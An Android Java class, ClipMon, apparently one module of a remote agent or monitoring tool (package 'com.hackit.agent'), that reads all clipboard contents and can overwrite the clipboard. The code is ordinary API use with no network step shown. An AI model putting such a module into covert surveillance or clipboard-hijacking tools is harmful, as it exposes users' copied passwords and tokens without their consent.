package com.hackit.agent;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;

/**
 * Clipboard read. Since Android 10 the clipboard answers only while the app
 * holds focus or is the default IME, so a null result is reported as empty
 * rather than guessed at.
 */
final class ClipMon {
    static String read(Context ctx) {
        try {
            ClipboardManager manager = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
            if (manager == null || !manager.hasPrimaryClip()) {
                return "";
            }
            ClipData clip = manager.getPrimaryClip();
            if (clip == null || clip.getItemCount() == 0) {
                return "";
            }
            StringBuilder out = new StringBuilder();
            for (int i = 0; i < clip.getItemCount(); i++) {
                CharSequence text = clip.getItemAt(i).coerceToText(ctx);
                if (text != null) {
                    if (out.length() > 0) {
                        out.append('\n');
                    }
                    out.append(text);
                }
            }
            return out.toString();
        } catch (Throwable exc) {
            Log.d("clip: " + exc);
            return "";
        }
    }

    static boolean write(Context ctx, String text) {
        try {
            ClipboardManager manager = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
            if (manager == null) {
                return false;
            }
            manager.setPrimaryClip(ClipData.newPlainText("text", text));
            return true;
        } catch (Throwable exc) {
            return false;
        }
    }

    private ClipMon() {
    }
}
